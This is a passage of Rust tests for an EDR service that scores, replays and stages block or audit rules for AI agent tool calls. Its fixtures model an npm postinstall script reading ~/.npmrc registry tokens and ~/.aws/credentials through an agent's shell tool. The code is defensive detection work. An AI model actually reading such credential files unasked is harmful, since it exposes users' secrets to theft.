            .unwrap_or_else(|e| {
                panic!("failed to decode EndpointSecurity degradation receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing EndpointSecurity degradation endpointDecision"));
        assert_eq!(endpoint_decision["receiptFamily"], "provider_degradation");
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.endpoint_security"
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["droppedEventCount"],
            3
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["deadlineMissCount"],
            2
        );
        let dropped_hash = sha256(b"3").to_hex_prefixed();
        let deadline_hash = sha256(b"2").to_hex_prefixed();
        let evidence = endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity degradation receipt evidence"));
        assert!(evidence.iter().any(|item| {
            item["key"] == "droppedEventCount"
                && item["valueHash"].as_str() == Some(dropped_hash.as_str())
        }));
        assert!(evidence.iter().any(|item| {
            item["key"] == "deadlineMissCount"
                && item["valueHash"].as_str() == Some(deadline_hash.as_str())
        }));
    }

    #[test]
    fn agent_secret_touch_publish_keys_can_filter_current_observation_edges() {
        let timestamp = chrono::Utc::now();
        let credential_node_id = "credential-node-1".to_string();
        let mut credential_attributes = BTreeMap::new();
        credential_attributes.insert(
            "credentialKind".to_string(),
            serde_json::Value::String("cloud_credential".to_string()),
        );
        credential_attributes.insert(
            "path".to_string(),
            serde_json::Value::String("/Users/alice/.aws/credentials".to_string()),
        );
        let graph = CausalGraph {
            nodes: BTreeMap::from([(
                credential_node_id.clone(),
                CausalNode {
                    node_id: credential_node_id.clone(),
                    kind: CausalNodeKind::Credential,
                    label: "/Users/alice/.aws/credentials".to_string(),
                    first_seen: timestamp,
                    last_seen: timestamp,
                    attributes: credential_attributes,
                },
            )]),
            edges: vec![clawdstrike_policy_event::edr::CausalEdge {
                edge_id: "edge-credential-1".to_string(),
                from: "process-node-1".to_string(),
                to: credential_node_id.clone(),
                kind: CausalEdgeKind::AccessedCredential,
                timestamp,
                observation_id: "credential-observation-1".to_string(),
                attributes: BTreeMap::new(),
            }],
        };
        let first_observation = EndpointObservation {
            observation_id: "credential-observation-1".to_string(),
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::CloudCredential,
                path: Some("/Users/alice/.aws/credentials".to_string()),
                name: None,
            },
            ..EndpointObservation::default()
        };
        let second_observation = EndpointObservation {
            observation_id: "credential-observation-2".to_string(),
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::CloudCredential,
                path: Some("/Users/alice/.aws/credentials".to_string()),
                name: None,
            },
            ..EndpointObservation::default()
        };
        let observation_ids = [&first_observation, &second_observation]
            .iter()
            .map(|observation| observation.observation_id.as_str())
            .collect::<BTreeSet<_>>();

        let keys =
            agent_secret_touch_publish_keys(&credential_node_id, &graph, Some(&observation_ids));

        assert!(keys.contains("credential-node-1|credential-observation-1"));
        assert!(!keys.contains("credential-node-1|credential-observation-2"));

        let backfill_keys = agent_secret_touch_publish_keys(&credential_node_id, &graph, None);
        assert_eq!(backfill_keys, keys);
    }

    #[tokio::test]
    async fn agent_edr_policy_simulation_scores_persisted_graph_and_receipts() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/policy-simulation",
                post(agent_edr_policy_simulation),
            )
            .with_state(state);
        let observations = vec![
            EndpointObservation {
                host_id: Some("host-sim-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-sim-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-sim-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::PackageScript {
                    manager: PackageManager::Npm,
                    package: Some("@acme/widget".to_string()),
                    phase: "postinstall".to_string(),
                    script: "node scripts/postinstall.js".to_string(),
                    working_directory: Some("/repo".to_string()),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-sim-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-sim-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "sim-credential-1".to_string(),
                host_id: Some("host-sim-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-sim-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-sim-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::PackageRegistryToken,
                    path: Some("/Users/alice/.npmrc".to_string()),
                    name: Some("npm-token".to_string()),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-sim-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-sim-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "sim-tool-1".to_string(),
                host_id: Some("host-sim-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-sim-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-sim-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "npm install"
                    }),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-sim-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-sim-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "block",
            "process": {
                "processGuid": "proc-sim-1"
            },
            "ruleId": "endpoint.policy.simulation.block_npm",
            "description": "block npm postinstall",
            "maxDepth": 8
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/policy-simulation")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy simulation request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy simulation request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy simulation response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy simulation response: {e}"));

        assert_eq!(payload["simulation"]["wouldBlock"], true);
        assert_eq!(
            payload["simulation"]["ruleId"],
            "endpoint.policy.simulation.block_npm"
        );
        assert!(
            payload["simulation"]["developerBreakageScore"]
                .as_u64()
                .unwrap_or_default()
                >= 70
        );
        assert!(
            payload["simulation"]["affectedCredentialCount"]
                .as_u64()
                .unwrap_or_default()
                >= 1
        );
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing simulation graph nodes"))
            .values()
            .any(|node| node["kind"] == "package_script"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing simulation affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing simulation affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "session"
                && identity["value"] == "session-sim-1"));
        assert!(
            payload["simulation"]["affectedTools"]
                .as_array()
                .unwrap_or_else(|| panic!("missing simulation affected tools"))
                .iter()
                .any(|tool| tool["toolName"] == "mcp.shell"
                    && tool["toolCallId"] == "tool-call-sim-1")
        );

        let signed: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode simulation receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing endpointDecision simulation metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing simulation receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse simulation receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "simulation");
        assert_eq!(
            endpoint_decision["decision"]["findingId"],
            payload["simulation"]["simulationId"]
        );
    }

    #[tokio::test]
    async fn agent_edr_policy_replay_binds_current_policy_to_persisted_graph() {
        let state = Arc::new(test_state());
        let policy_path = state
            .settings
            .try_read()
            .unwrap_or_else(|e| panic!("failed to read test settings: {e}"))
            .policy_path
            .clone();
        std::fs::write(
            &policy_path,
            "version: \"test-edr-replay\"\npolicy_epoch: 77\nname: agent-api-test\n",
        )
        .unwrap_or_else(|err| panic!("failed to write replay test policy: {err}"));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/policy-replay",
                post(agent_edr_policy_replay),
            )
            .with_state(state);
        let observations = vec![
            EndpointObservation {
                host_id: Some("host-replay-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-replay-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-replay-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::PackageScript {
                    manager: PackageManager::Npm,
                    package: Some("@acme/widget".to_string()),
                    phase: "postinstall".to_string(),
                    script: "node scripts/postinstall.js".to_string(),
                    working_directory: Some("/repo".to_string()),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-replay-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-replay-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "replay-credential-1".to_string(),
                host_id: Some("host-replay-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-replay-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-replay-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::PackageRegistryToken,
                    path: Some("/Users/alice/.npmrc".to_string()),
                    name: Some("npm-token".to_string()),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-replay-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-replay-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "replay-tool-1".to_string(),
                host_id: Some("host-replay-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-replay-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-replay-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "npm install"
                    }),
                },
                metadata: BTreeMap::from([
                    ("agentId".to_string(), serde_json::json!("agent-replay-1")),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-replay-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "process": {
                "processGuid": "proc-replay-1"
            },
            "maxDepth": 8
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/policy-replay")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy replay request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy replay request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy replay response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy replay response: {e}"));

        assert_eq!(payload["replay"]["mode"], "current_policy_graph_replay");
        assert_eq!(
            payload["replay"]["policy"]["policyVersion"],
            "test-edr-replay"
        );
        assert_eq!(payload["replay"]["policy"]["policyEpoch"], 77);
        assert_eq!(payload["replay"]["wouldEnforce"], true);
        assert_eq!(payload["simulation"]["wouldBlock"], true);
        assert!(payload["simulation"]["ruleId"]
            .as_str()
            .unwrap_or_default()
            .starts_with("endpoint.current_policy_replay.epoch_77."));
        assert!(
            payload["replay"]["observationCount"]
                .as_u64()
                .unwrap_or_default()
                >= 2
        );
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing replay graph nodes"))
            .values()
            .any(|node| node["kind"] == "package_script"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing replay affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing replay affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "session"
                && identity["value"] == "session-replay-1"));
        assert!(payload["simulation"]["affectedTools"]
            .as_array()
            .unwrap_or_else(|| panic!("missing replay affected tools"))
            .iter()
            .any(|tool| tool["toolName"] == "mcp.shell"
                && tool["toolCallId"] == "tool-call-replay-1"));

        let signed: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode replay receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing endpointDecision replay metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing replay receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse replay receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "simulation");
        assert_eq!(endpoint_decision["policy"]["policyEpoch"], 77);
        assert_eq!(
            endpoint_decision["decision"]["findingId"],
            payload["simulation"]["simulationId"]
        );
    }

    #[tokio::test]
    async fn agent_edr_detection_candidate_generates_staged_simulated_rule() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/detection-candidate",
                post(agent_edr_detection_candidate),
            )
            .with_state(state);
        let observations = vec![
            EndpointObservation {
                host_id: Some("host-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::PackageScript {
                    manager: PackageManager::Npm,
                    package: Some("@acme/widget".to_string()),
                    phase: "postinstall".to_string(),
                    script: "node scripts/postinstall.js".to_string(),
                    working_directory: Some("/repo".to_string()),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "candidate-credential-1".to_string(),
                host_id: Some("host-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::PackageRegistryToken,
                    path: Some("/Users/alice/.npmrc".to_string()),
                    name: Some("npm-token".to_string()),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "candidate-tool-1".to_string(),
                host_id: Some("host-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "npm install"
                    }),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build candidate findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("candidate findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "process": {
                "processGuid": "proc-candidate-1"
            },
            "maxDepth": 8
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/detection-candidate")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build detection candidate request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("detection candidate request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read detection candidate response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode detection candidate response: {e}"));

        assert_eq!(payload["candidate"]["action"], "block");
        assert!(payload["candidate"]["ruleId"]
            .as_str()
            .unwrap_or_default()
            .starts_with("endpoint.generated.block.process."));
        assert_eq!(
            payload["candidate"]["graphSliceId"],
            payload["simulation"]["graphSliceId"]
        );
        assert_eq!(
            payload["simulation"]["ruleId"],
            payload["candidate"]["ruleId"]
        );
        assert!(
            payload["simulation"]["developerBreakageScore"]
                .as_u64()
                .unwrap_or_default()
                >= 70
        );
        assert_eq!(payload["recommendedStage"], "audit");
        let stage_plan = payload["stagePlan"]
            .as_array()
            .unwrap_or_else(|| panic!("missing detection candidate stage plan"));
        assert!(stage_plan.iter().any(|stage| stage["stage"] == "observe"));
        assert!(stage_plan.iter().any(|stage| stage["stage"] == "audit"
            && stage["recommended"] == serde_json::Value::Bool(true)));
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing candidate graph nodes"))
            .values()
            .any(|node| node["kind"] == "credential"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing candidate affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "user" && identity["value"] == "alice"));
        assert!(payload["simulation"]["affectedIdentities"]
            .as_array()
            .unwrap_or_else(|| panic!("missing candidate affected identities"))
            .iter()
            .any(|identity| identity["identityKind"] == "session"
                && identity["value"] == "session-candidate-1"));
        assert!(payload["simulation"]["affectedTools"]
            .as_array()
            .unwrap_or_else(|| panic!("missing candidate affected tools"))
            .iter()
            .any(|tool| tool["toolName"] == "mcp.shell"
                && tool["toolCallId"] == "tool-call-candidate-1"));

        let signed: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode detection candidate receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing detection candidate endpointDecision metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing detection candidate receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key).unwrap_or_else(|e| {
            panic!("failed to parse detection candidate receipt public key: {e}")
        });
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "simulation");
        assert_eq!(
            endpoint_decision["decision"]["findingId"],
            payload["simulation"]["simulationId"]
        );
    }

    #[test]
    fn edr_terminate_process_tree_policy_promotion_is_simulation_only() {
        let simulation = EndpointPolicySimulationReport {
            simulation_id: "policy-simulation-terminate-1".to_string(),
            rule_id: "endpoint.generated.terminate_process_tree.process.test".to_string(),
            action: EndpointDecisionAction::TerminateProcessTree,
            root_node_id: "node-process-1".to_string(),
            graph_slice_id: "graph-slice-terminate-1".to_string(),
            would_block: true,
            created_at: chrono::Utc::now(),
            affected_node_count: 1,
            affected_edge_count: 0,
            affected_process_count: 1,
            affected_file_count: 0,
            affected_network_count: 0,
            affected_credential_count: 0,
            affected_tool_count: 0,
            developer_breakage_score: 0,
            impact_level: EndpointSimulationImpactLevel::None,
            summary: "terminate process tree dry-run only".to_string(),
            affected_nodes: Vec::new(),
            affected_identities: Vec::new(),
            affected_tools: Vec::new(),
        };

        assert!(supported_edr_simulation_action(
            &EndpointDecisionAction::TerminateProcessTree
        ));
        assert_eq!(
            recommended_detection_stage(&simulation, &CausalNodeKind::Process),
            "audit"
        );
        let stage_plan =
            detection_candidate_stage_plan(&simulation, &CausalNodeKind::Process, "audit");
        assert!(stage_plan.iter().any(|stage| {
            stage.stage == "audit"
                && stage.action == EndpointDecisionAction::Alert
                && stage.recommended
        }));
        assert!(!stage_plan
            .iter()
            .any(|stage| stage.stage == "limited_block" || stage.stage == "full_block"));
        assert!(!policy_delta_stage_is_enforcing(
            "limited_block",
            &EndpointDecisionAction::TerminateProcessTree
        ));
        assert!(!policy_delta_stage_materializes_guard(
            &CausalNodeKind::Process,
            &EndpointDecisionAction::SuspendProcessTree
        ));
        let mut suspend_simulation = simulation.clone();
        suspend_simulation.action = EndpointDecisionAction::SuspendProcessTree;
        assert_eq!(
            recommended_detection_stage(&suspend_simulation, &CausalNodeKind::Process),
            "audit"
        );
        let suspend_stage_plan =
            detection_candidate_stage_plan(&suspend_simulation, &CausalNodeKind::Process, "audit");
        assert!(!suspend_stage_plan
            .iter()
            .any(|stage| stage.stage == "limited_block" || stage.stage == "full_block"));

        let error = validate_policy_delta_stage_action(
            "limited_block",
            &EndpointDecisionAction::TerminateProcessTree,
        )
        .unwrap_err();
        assert_eq!(error.0, StatusCode::BAD_REQUEST);
        assert!(error.1.contains("dry-run only"));
        assert!(validate_policy_delta_stage_action(
            "audit",
            &EndpointDecisionAction::TerminateProcessTree,
        )
        .is_ok());
    }

    #[tokio::test]
    async fn agent_edr_staged_detections_persist_generated_candidate_stage() {
        let staged_detection_path = test_staged_detection_path();
        let _ = std::fs::remove_file(&staged_detection_path);
        let mut state = test_state();
        state.edr_staged_detection_ledger = Arc::new(Mutex::new(
            EndpointStagedDetectionLedger::open(&staged_detection_path)
                .unwrap_or_else(|e| panic!("failed to open staged detection ledger: {e}")),
        ));
        let state = Arc::new(state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/staged-detections",
                get(agent_edr_staged_detections).post(agent_edr_stage_detection),
            )
            .with_state(state);
        let observations = vec![
            EndpointObservation {
                host_id: Some("host-stage-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-stage-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-stage-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::PackageScript {
                    manager: PackageManager::Npm,
                    package: Some("@acme/widget".to_string()),
                    phase: "postinstall".to_string(),
                    script: "node scripts/postinstall.js".to_string(),
                    working_directory: Some("/repo".to_string()),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-stage-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-stage-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "stage-candidate-credential-1".to_string(),
                host_id: Some("host-stage-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-stage-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-stage-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::CredentialAccess {
                    kind: CredentialKind::PackageRegistryToken,
                    path: Some("/Users/alice/.npmrc".to_string()),
                    name: Some("npm-token".to_string()),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-stage-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-stage-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "stage-candidate-tool-1".to_string(),
                host_id: Some("host-stage-candidate-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-stage-candidate-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-stage-candidate-1".to_string()),
                    image: Some("/usr/local/bin/npm".to_string()),
                    command_line: Some("npm install".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "npm install"
                    }),
                },
                metadata: BTreeMap::from([
                    (
                        "agentId".to_string(),
                        serde_json::json!("agent-stage-candidate-1"),
                    ),
                    (
                        "toolCallId".to_string(),
                        serde_json::json!("tool-call-stage-candidate-1"),
                    ),
                ]),
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build staged detection findings: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("staged detection findings failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "process": {
                "processGuid": "proc-stage-candidate-1"
            },
            "maxDepth": 8,
            "selectedStage": "audit",
            "crossWindowImpactHash": "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "crossWindowRecommendationHash": "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
            "stagedBy": "operator:alice",
            "note": "stage npm credential guard for audit"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/staged-detections")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build staged detection request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("staged detection request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
